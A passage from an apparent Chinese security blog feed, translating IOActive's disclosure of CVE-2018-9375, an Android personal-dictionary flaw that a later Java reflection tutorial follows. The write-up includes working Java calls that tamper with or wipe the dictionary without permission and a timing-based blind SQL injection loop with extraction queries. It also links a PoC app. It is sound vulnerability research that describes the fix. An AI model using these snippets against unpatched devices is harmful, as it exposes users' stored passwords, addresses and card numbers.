&lt;p&gt;这个中等风险的漏洞被归类为权限提升，并于2018年6月修复，影响到Android的以下版本：6.0、6.0.1、7.0、7.1.1、7.1.2、8.0和8.1。&lt;/p&gt;

&lt;h3 id=&#34;用户的个人词典&#34;&gt;用户的个人词典&lt;/h3&gt;

&lt;p&gt;Android提供了一个自定义词典，可以手动输入或者自动定制，从用户的输入中学习。这本字典的入口为“设置→ 语言和键盘 → 个人词典” （也可能在“高级“或者不同的选项下）。他可能包含有敏感信息，比如姓名、地址、电话号码、电子邮件、密码、商业品牌、不存常的词汇（可能包括疾病、药品、技术术语等），甚至信用卡号。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212058.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;用户还可以为每个单词或者句子定义一个快捷方式，因此想要输入的家庭地址的时候，你可以添加一个条目并简单地为其添加一个快捷方式（比如“myhome”）来自动完成填写。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212115.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在内部，这些单词存储在SQLLite数据库中，该数据库只包含有一个名为“words”的表（除了“android_metadata” ），这个表有6列：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_id (INTEGER, PRIMARY KEY)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;word (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;frequency (INTEGER)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;locale (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appid (INTEGER)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shortcut (TEXT)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们主要注意“word&amp;rdquo;这列，正如名称所示，它包含了自定义的单词。然而，同一数据库中所有剩余的列和表也可以访问。&lt;/p&gt;

&lt;h3 id=&#34;漏洞细节&#34;&gt;漏洞细节&lt;/h3&gt;

&lt;p&gt;在较早版本的Android中，对个人字典的读写访问分别受到以下权限的保护：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;android.permission.READ_USER_DICTIONARY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;android.permission.WRITE_USER_DICTIONARY&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于新版本来说，这已经不再适用了，根据官方文档[1]:&amp;ldquo;从API 23开始，用户字典只能通过IME和拼写检查器访问” ，以前的权限已经被内部检查所取代，因此理论上，只有特权帐户(比如 &lt;code&gt;root&lt;/code&gt; 和 &lt;code&gt;system&lt;/code&gt;), 启用的IMEs和拼写检查器可以访问个人字典内容提供者  (&lt;code&gt;content://user_dictionary/words&lt;/code&gt;)。&lt;/p&gt;

&lt;p&gt;我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为&lt;code&gt;canCallerAccessUserDictionary&lt;/code&gt; 的私有函数，并从 &lt;code&gt;UserDictionary&lt;/code&gt;  内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。&lt;/p&gt;

&lt;p&gt;虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。&lt;/p&gt;

&lt;p&gt;在下面的 &lt;code&gt;UserDictionaryProvider&lt;/code&gt;类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override

public int delete(Uri uri, String where, String[] whereArgs) {
   SQLiteDatabase db = mOpenHelper.getWritableDatabase();
   int count;
   switch (sUriMatcher.match(uri)) {
      case WORDS:
          count = db.delete(USERDICT_TABLE_NAME, where, whereArgs);  //db.delete
          break;
 
      case WORD_ID:
          String wordId = uri.getPathSegments().get(1);
          count = db.delete(USERDICT_TABLE_NAME, Words._ID + &amp;quot;=&amp;quot; + wordId    //db.delete
               + (!TextUtils.isEmpty(where) ? &amp;quot; AND (&amp;quot; + where + &#39;)&#39; : &amp;quot;&amp;quot;), whereArgs);
          break;
 
       default:
          throw new IllegalArgumentException(&amp;quot;Unknown URI &amp;quot; + uri);
   }
 
   // Only the enabled IMEs and spell checkers can access this provider.
   if (!canCallerAccessUserDictionary()) {   //!canCallerAccessUserDictionary()
       return 0;
   }

   getContext().getContentResolver().notifyChange(uri, null);
   mBackupManager.dataChanged();
   return count;
}


@Override

public int update(Uri uri, ContentValues values, String where, String[] whereArgs) {
   SQLiteDatabase db = mOpenHelper.getWritableDatabase();
   int count;
   switch (sUriMatcher.match(uri)) {
      case WORDS:
         count = db.update(USERDICT_TABLE_NAME, values, where, whereArgs);  //db.update
         break;

      case WORD_ID:
         String wordId = uri.getPathSegments().get(1);
         count = db.update(USERDICT_TABLE_NAME, values, Words._ID + &amp;quot;=&amp;quot; + wordId  //db.update
+ (!TextUtils.isEmpty(where) ? &amp;quot; AND (&amp;quot; + where + &#39;)&#39; : &amp;quot;&amp;quot;), whereArgs);
         break;

      default:
         throw new IllegalArgumentException(&amp;quot;Unknown URI &amp;quot; + uri);
   }

   // Only the enabled IMEs and spell checkers can access this provider.
   if (!canCallerAccessUserDictionary()) {       //!canCallerAccessUserDictionary()
      return 0;
   }

   getContext().getContentResolver().notifyChange(uri, null);
   mBackupManager.dataChanged();
   return count;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后注意&lt;code&gt;AndroidManifest.xml&lt;/code&gt;文件对于显式导出的内容提供者不提供任何额外的保护（例如，intent过滤器或权限）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;manifest xmlns:android=&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;
       package=&amp;quot;com.android.providers.userdictionary&amp;quot;
       android:sharedUserId=&amp;quot;android.uid.shared&amp;quot;&amp;gt;

   &amp;lt;application android:process=&amp;quot;android.process.acore&amp;quot;
       android:label=&amp;quot;@string/app_label&amp;quot;
       android:allowClearUserData=&amp;quot;false&amp;quot;
       android:backupAgent=&amp;quot;DictionaryBackupAgent&amp;quot;
       android:killAfterRestore=&amp;quot;false&amp;quot;
       android:usesCleartextTraffic=&amp;quot;false&amp;quot;
       &amp;gt;

       &amp;lt;provider android:name=&amp;quot;UserDictionaryProvider&amp;quot;      //&amp;quot;UserDictionaryProvider&amp;quot;
          android:authorities=&amp;quot;user_dictionary&amp;quot;
          android:syncable=&amp;quot;false&amp;quot;
          android:multiprocess=&amp;quot;false&amp;quot;
          android:exported=&amp;quot;true&amp;quot; /&amp;gt;                     //android:exported=&amp;quot;true&amp;quot;

   &amp;lt;/application&amp;gt;
&amp;lt;/manifest&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;攻击者只需从任何恶意应用程序调用如下代码，就可以更新用户字典的内容，而无需请求任何许可：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentValues values = new ContentValues();
values.put(UserDictionary.Words.WORD, &amp;quot;IOActive&amp;quot;);

getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,
        null, null);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;删除任何内容，包括整个个人字典也很简单：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;getContentResolver().delete(UserDictionary.Words.CONTENT_URI, null, null); 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两种方法(&lt;code&gt;update&lt;/code&gt; 和&lt;code&gt;delete&lt;/code&gt;) 都应该返回受影响的行数，但是在这种情况下(对于非法的调用) 总是返回零，这使得攻击者更难从内容提供者提取或推断出任何信息。&lt;/p&gt;

&lt;p&gt;在这一点上，从攻击者者的角度来看，这可能是我们所能做的全部。虽然删除或更新任意条目可能会给最终用户带来麻烦，但最有趣的部分是访问个人数据。&lt;/p&gt;

&lt;p&gt;即使查询功能没有受到这个功能的直接影响，但仍然可以通过利用基于时间的侧通道攻击来转储整个内容。 由于攻击者完全可控&lt;code&gt;where&lt;/code&gt;参数，并且由于任何行的成功更新比不影响任何行的同一语句需要更多时间来执行，所以下面描述的攻击被证明是有效的。&lt;/p&gt;

&lt;h3 id=&#34;简单的poc&#34;&gt;简单的PoC&lt;/h3&gt;

&lt;p&gt;考虑从恶意应用程序运行以下代码片段:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentValues values = new ContentValues();
values.put(UserDictionary.Words._ID, 1);

long t0 = System.nanoTime();
for (int i=0; i&amp;lt;200; i++) {
    getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,
                    &amp;quot;_id = 1 AND word LIKE &#39;a%&#39;&amp;quot;, null);         //AND word LIKE &#39;a%&#39;&amp;quot;
}
long t1 = System.nanoTime();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;多次调用相同的语句（比如200次，取决于设备），计算为“true”的SQL条件与计算为“false”的条件之间的时间差(t1-t0)结果将是显而易见的,这将允许攻击者通过利用一个典型的基于时间的布尔盲注Sql注入攻击来提取出受影响数据库中的所有信息。&lt;/p&gt;

&lt;p&gt;因此，如果字典中的第一个用户自定义的单词以字母“a”开头，这个条件将被评估为“true”，上面的代码片段将需要更多的时间来执行（比如5秒），而当猜测为假时所需的时间较短(比如2秒)。因为在这种情况下，没有任何一行会被更新。如果猜错了，我们可以用“b”，“c”，等等。 如果猜测是正确的，就意味着我们知道单词的第一个字符，所以我们可以使用相同的方法来猜测第二个字符。然后我们可以移到下一个单词，以此类推，直到我们转储整个字典或任何可过滤的行和字段子集。&lt;/p&gt;

&lt;p&gt;为了避免更改数据库的内容，请注意我们如何更新检索到的单词的“id”列，以匹配它的原始值，因此内部幂等语句将如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;UPDATE words SET _id=N WHERE _id=N AND (condition)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果条件为真，那么带有标识符“N”的行会将以一种不会改变其标识符的方式进行更新，因为它将被设置为其原始值，而行则保持不变。这是一种非侵入性的方法，使用执行时间作为侧通道oracle来提取数据。&lt;/p&gt;

&lt;p&gt;因为我们可以用任何子SELECT语句替换上面的条件，所以这种攻击可以扩展到查询SQLite中支持的任何SQL表达式，例如：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&amp;lsquo;something&amp;rsquo;这个词存储在字典里吗？&lt;/li&gt;
&lt;li&gt;检索所有16个字符的单词（如信用卡号）&lt;/li&gt;
&lt;li&gt;检索所有有快捷方式的单词&lt;/li&gt;
&lt;li&gt;检索包含一个点的所有单词&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;真实的利用&#34;&gt;真实的利用&lt;/h3&gt;

&lt;p&gt;上面描述的过程可以完全自动化和优化。我开发了一个简单的Android应用程序来证明它的可利用性并测试它的有效性。&lt;/p&gt;

&lt;p&gt;PoC应用程序基于这样的假设：我们可以通过上述的内容提供者盲目地更新&lt;code&gt;UserDictionary&lt;/code&gt;数据库中的任意行。 如果内部更新语句影响一或多行，则需要更多的时间来执行。 这基本上是我们所需要的，以便推断以SQL条件形式的假设是否被评估为true或false。&lt;/p&gt;

&lt;p&gt;但是，由于在这个初始阶段，我们没有任何关于内容的信息(甚至没有内部标识符的值)，而不是遍历所有可能的标识符值，我们将从具有最低标识符的行开始， 并将其“frequency”字段的原始值粉碎为任意数字。这个步骤可以使用不同的有效方法来完成。&lt;/p&gt;

&lt;p&gt;由于多个共享进程将同时在Android上运行，因此相同调用的总运行时间会因不同的执行而有所不同。此外，执行时间还决于每个设备的处理能力和性能。然而，从统计的角度来看，重复相同的调用，大量的迭代应该给我们一个平均的可微度量。 这就是为什么我们需要调整每个设备和当前配置的迭代次数（例如，在省电模式下）。&lt;/p&gt;

&lt;p&gt;尽管我尝试了一种更复杂的方法来确定响应时间是否应该被解释成真或假，但我最终实现了一种更简单的方法，从而获得了准确和可靠的结果。 只要计算相同数量的总是为“true”请求（e.g. “&lt;code&gt;WHERE 1=1&lt;/code&gt;”) 和总是为”false&amp;rdquo;的请求(e.g. “&lt;code&gt;WHERE 1=0&lt;/code&gt;”)  ，并以平均时间作为临界值来区分它们。比临界值更大的测量时间将被解释为真; 反之为假。这不是人工智能或大数据，也不是使用区块链或云计算，而是 K.I.S.S. 原理适用并有效！&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212145.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;一旦我们有了区分正确和错误假设的方法，那么转储整个数据库就变得轻而易举了。前一节中描述的示例很容易理解，但它并不是最有效的提取信息的方法。 在我们的PoC中，我们将使用二分查找算法[4]来代替任何数字查询，使用以下简单的方法：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;确定表的行数（可选）

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT COUNT(*) FROM words&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;确定最低的标识符

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT MIN(_id) FROM words&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用该标识符确定单词的字符数。

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT length(word) FROM words WHERE _id=N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;遍历该单词，通过字符提取字符（在字符/unicode中）

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT unicode(substr(word, i, 1)) FROM words WHERE _id=N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;确定比我们得到的标识符大的最低标识符，并重复

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT MIN(_id) FROM words WHERE _id &amp;gt; N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;请记住，我们不能直接检索任何数字或字符串值，因此我们需要将这些表达式转换为一组布尔查询，这些查询可以根据它们的执行时间计算为true或false。这就是二分查找算法的工作原理。我们不会直接查询一个数字，而是反复查询：它是否大于X？”，在每次迭代中调整X的值，直到在log(n)查询后找到正确的值为止。例如，如果检索的当前值是97，那么该算法的执行跟踪将如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212208.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;poc利用工具&#34;&gt;PoC利用工具&lt;/h3&gt;

&lt;p&gt;上面描述的过程是在PoC工具中实现的，如下所示 。这个PoC的源代码和编译的APK可以从下面的GitHub存储库找到： &lt;a href=&#34;https://github.com/IOActive/AOSP-ExploitUserDictionary&#34;&gt;https://github.com/IOActive/AOSP-ExploitUserDictionary&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;让我们看看它的极简用户界面，并解释它的特性。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212218.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;应用程序做的第一件事是尝试直接访问个人字典内容提供者，查询条目的数量。在正常情况下（不是作为root运行，等等），我们不应该有访问权限。 如果出于任何原因我们实现了直接访问，使用基于时间的盲注方法来利用任何东西是没有意义的，但是即使在这种情况下，我们也欢迎您将CPU运行浪费在这个PoC上，而不是挖掘加密货币。&lt;/p&gt;

&lt;p&gt;如前所述，只有两个参数需要调整：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Initial number of iterations&lt;/strong&gt; （初始迭代次数）：有多少次相同的调用会被重复以获得显著的时间差。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Minimum time threshold&lt;/strong&gt; （最短时间临界值，以毫秒为单位）：多少时间将被视为可接受的最低值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然该工具的当前版本将自动调整它们，但在第一阶段，一切都是手动的，工具只是提供这些参数，因此这就是存在这些控制的原因之一。&lt;/p&gt;

&lt;p&gt;从理论上讲，这些数字越大，我们得到的精确度就越高，但提取的速度会更慢。如果它们更小，它将运行得更快，但它更有可能获得不准确的结果。这就是为什么存在最少10次迭代和200毫秒的硬编码。&lt;/p&gt;

&lt;p&gt;如果我们按下“开始”按钮，应用程序将启动参数的自动调整。首先，它将运行一些查询并丢弃结果，因为最初的查询通常比较高且不具有代表性。然后，它将执行初始的迭代次数并估计相应的临界值。如果获得的临界值超过了我们配置的最小值，那么它将运行20个连续的查询，交替执行true和false语句来测试估计的准确性。 如果准确度较差（只允许一个错误），然后，它将增加迭代次数，并按设定的次数重复处理，直到参数被适当调整，或者在条件不能满足时放弃和退出。&lt;/p&gt;

&lt;p&gt;一旦进程启动，一些控件将被禁用，我们将在下面的可滚动日志窗口(也通过logcat)中看到当前详细的输出，在其中我们可以看到当前行标识符、所有SQL子查询、总时间和推断的真实性。检索到的字符将在提取后立即出现在上面一行中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180805212230.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;最后，右边的“UPD&amp;rdquo;和DEL&amp;rdquo;按钮与基于时间的提取控件完全无关，他们只是简单地实现对内容提供者的直接调用，分别执行更新和删除操作。它们被有意地限制在只以“123”开头的单词。这样做是为了避免任何个人字典的意外删除，因此为了测试这些方法，我们需要手动添加这个条目，除非我们已经有了。&lt;/p&gt;

&lt;h3 id=&#34;demo&#34;&gt;Demo&lt;/h3&gt;

&lt;p&gt;总结这个过程的最简单的方法可能是在下面的视频中观看工具的动作，记录在一个真正的设备中。(可能无法观看)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=8i-oMcaJw40&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/8i-oMcaJw40/0.jpg&#34; alt=&#34;IMAGE ALT TEXT HERE&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=VQf-INNTKKU&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/VQf-INNTKKU/0.jpg&#34; alt=&#34;IMAGE ALT TEXT HERE&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;额外的注意事项&#34;&gt;额外的注意事项&lt;/h3&gt;

&lt;p&gt;理论和实践之间通常存在差距，所以我也想在这个PoC的设计和开发过程中分享我遇到的一些问题。 首先，请记住，该工具只是一个快速和肮脏的PoC。 它的主要目标是证明利用是可行的，并且可以直接实现，这就是为什么它有一些限制并且不遵循推荐的编程最佳实践，因为它不意味着可维护，高效，提供良好的用户体验，等等。&lt;/p&gt;

&lt;p&gt;在初始阶段，我并不关心UI，一切消息都被转储到Android日志输出中。当我决定在GUI中显示结果时，我不得不在一个单独的线程中运行所有的代码，以避免阻塞UI线程  (这可能会导致应用程序被认为是无响应的因此被操作系统杀死）。由于这个简单的更改，精确度大大下降，因为线程没有太高的优先级，所以我将其设置为“-20”，这是允许的最大优先级，之后一切都恢复正常工作了。&lt;/p&gt;

&lt;p&gt;从一个单独的线程更新UI可能会导致崩溃，通常会通过运行时异常来检测和限制，因此为了显示日志消息，我不得不使用对 &lt;code&gt;runOnUiThread&lt;/code&gt; 的调用来调用它们。请记住，在实际的利用中，根本不需要UI。&lt;/p&gt;

&lt;p&gt;如果个人字典为空，则不能使用任何行去强制更新，因此所有查询的执行时间大致相同。在这种情况下，将没有任何东西可以提取，工具也不会调整参数，最终会停止运行。在一些奇怪的情况下，它可能会被随机地校准，即使是空的数据库，它也会尝试提取垃圾或伪随机数据。&lt;/p&gt;

&lt;p&gt;在常规的智能手机中，操作系统会在一段时间后进入睡眠模式，性能会大幅下降，导致执行时间超过预期值，因此所有的调用都将被评估为true。这可以被检测到并以不同的方式做出反应，但我只是选择了一个更简单的解决方案：我一直打开屏幕，并通过电源管理器获得一个唤醒锁，以防止操作系统挂起应用程序。 之后我没有费心去释放它，所以如果您不使用，您必须得关闭应用程序。&lt;/p&gt;

&lt;p&gt;旋转屏幕也会引起问题，因此，我将它强制设置为横向模式，以避免自动旋转，并利用额外的宽度来显示每条消息。&lt;/p&gt;

&lt;p&gt;一旦你按下“开始”按钮，一些控件将被永久禁用。如果您想要重新调整参数或多次运行它，您需要关闭它并重新打开它。&lt;/p&gt;

&lt;p&gt;一些外部事件和并行执行（例如同步电子邮件或接收推送消息) 可能会干扰应用程序的行为，可能会导致不准确的结果。如果发生这种情况，请在更稳定的条件下再试一次，比如禁用对网络的访问或关闭所有其他应用程序。&lt;/p&gt;

&lt;p&gt;UI不支持国际化，它不是为了在Unicode中提取单词而设计的（尽管它应该是微不足道的，但它并不是我的目标，这只是简单的一个PoC）。&lt;/p&gt;

&lt;p&gt;它被有意地限制为只提取前5个单词，并根据它们的内部标识进行排序。&lt;/p&gt;

&lt;h3 id=&#34;修复&#34;&gt;修复&lt;/h3&gt;

&lt;p&gt;从源代码的角度来看，修复非常简单。只要移动调用来检查调用者是否拥有受影响函数开始的权限，就足以解决这个问题。除了这个建议之外，我们还向Google提供了一个补丁文件，其中包含了建议的修复程序，这是他们修复漏洞的公告：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由于这个问题已经在官方存储库中被修复了，作为用户，我们必须确保我们当前安装的安全补丁级别包含CVE-2018-9375的补丁。例如，在Google pixel/nexus中，它于2018年6月发布：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://source.android.com/security/bulletin/pixel/2018-06-01&#34;&gt;https://source.android.com/security/bulletin/pixel/2018-06-01&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果由于任何原因，不能对您的设备进行更新，考虑检查您的个人字典的内容，并确保它不包含任何敏感信息，在不太可能的事件中，这个问题将被积极地利用。&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;软件开发是困难的。一个错误的行可能导致不良的结果。一项旨在提高用户个人词典的安全性和保护的改变导致了相反的结果，因为它无意中允许访问，而不需要任何特定的许可，并且在近3年的时间里没有被注意到。&lt;/p&gt;

&lt;p&gt;识别像这里描述的那样的漏洞可以像阅读和理解源代码一样简单，只需遵循执行流程即可。自动化测试可能有助于在早期发现这类问题，并防止它们在进一步的更改中再次发生，但是它们并不总是那么容易实现和维护。&lt;/p&gt;

&lt;p&gt;我们还学会了如何从一个漏洞中得到最大的好处，这个漏洞原则上只允许我们盲目地破坏或篡改数据，从而增加了它对信息披露的最终影响，而信息泄露是利用一个侧信道、基于时间的攻击来泄露所有数据。&lt;/p&gt;

&lt;p&gt;跳出固有思维去思考一件事，记住：时间是最有价值的资源之一。纳秒千金!&lt;/p&gt;

&lt;p&gt;[1] &lt;a href=&#34;https://developer.android.com/reference/android/provider/UserDictionary&#34;&gt;https://developer.android.com/reference/android/provider/UserDictionary&lt;/a&gt;
[2] Gerrit’s Change-Id: I6c5716d4d6ea9d5f55a71b6268d34f4faa3ac043
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/e0e0e0c9b27e10f7e33c371c490fdae8b634f117&#34;&gt;https://android.googlesource.com/platform/packages/providers/…&lt;/a&gt;
[3]At the time of discovery, it was found in the AOSP master branch:
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a&gt;
After the fix, the equivalent contents can be found in the following commit:
&lt;a href=&#34;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/0272515f306cf7f12d2babe03d625850990a00c1/src/com/android/providers/userdictionary/UserDictionaryProvider.java&#34;&gt;https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a&gt;
[4 ]&lt;a href=&#34;https://en.wikipedia.org/wiki/Binary_search_algorithm&#34;&gt;https://en.wikipedia.org/wiki/Binary_search_algorithm&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;[原文：&lt;a href=&#34;https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/&#34;&gt;Discovering and Exploiting a Vulnerability in Android’s Personal Dictionary (CVE-2018-9375)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
      
    </item>
    
    <item>
      <title>Java反射机制学习笔记</title>
      <link>https://naivete.cc/post/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Wed, 25 Jul 2018 16:40:20 +0800</pubDate>
      
      <guid>https://naivete.cc/post/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      
        <description>

&lt;h2 id=&#34;java-反射机制学习记录&#34;&gt;Java 反射机制学习记录&lt;/h2&gt;

&lt;p&gt;在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。&lt;/p&gt;

&lt;h3 id=&#34;什么是反射机制&#34;&gt;什么是反射机制？&lt;/h3&gt;

&lt;p&gt;反射(Reflection)是Java 程序开发语言的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。 通俗一点：在动态运行时，获取到一个类的所有方法以及成员。简而言之，通过反射，我们可以在&lt;strong&gt;运行时&lt;/strong&gt;获得程序或程序集中每一个类型的成员和成员的信息。&lt;/p&gt;

&lt;h3 id=&#34;作用&#34;&gt;作用？&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;1.在运行时判断任意一个对象所属的类；&lt;/li&gt;
&lt;li&gt;2.在运行时构造任意一个类的对象；&lt;/li&gt;
&lt;li&gt;3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；&lt;/li&gt;
&lt;li&gt;4.在运行时调用任意一个对象的方法&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;是运行时而不是编译时&#34;&gt;&lt;strong&gt;是运行时而不是编译时&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;获取某些类的一些变量，调用某些类的私有方法。&lt;/li&gt;
&lt;li&gt;增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;基本使用&#34;&gt;基本使用&lt;/h3&gt;

&lt;p&gt;反射相关的类一般都在java.lang.relfect 包里。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;获取Class对象 3种方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(1)使用Class类的forName静态方法:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static Class&amp;lt;?&amp;gt; forName(String className)
   //在JDBC开发中常用此方法加载数据库驱动:
   Class.forName(driver);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(2)直接获取某一个对象的class，比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   Class&amp;lt;?&amp;gt; klass = int.class;
   Class&amp;lt;?&amp;gt; classInt = Integer.TYPE;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(3)调用某个对象的getClass()方法,比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   StringBuilder str = new StringBuilder(&amp;quot;123&amp;quot;);
   Class&amp;lt;?&amp;gt; klass = str.getClass();
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;判断是否为某一个类的实例&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断  是一个Native方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public native boolean isInstance(Object obj);
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;创建实例&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通过放射来生成对象两种方式：&lt;/p&gt;

&lt;p&gt;（1）使用Class对象的newInstance()方法来创建Class对象对应类的实例。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   Class&amp;lt;?&amp;gt; c = String.class;
   Object str = c.newInstance();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;（2）先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   //获取String所对应的Class对象
   Class&amp;lt;?&amp;gt; c = String.class;
   //获取String类带一个String参数的构造器
   Constructor constructor = c.getConstructor(String.class);
   //根据构造器创建实例
   Object obj = constructor.newInstance(&amp;quot;23333&amp;quot;);
   System.out.println(obj);
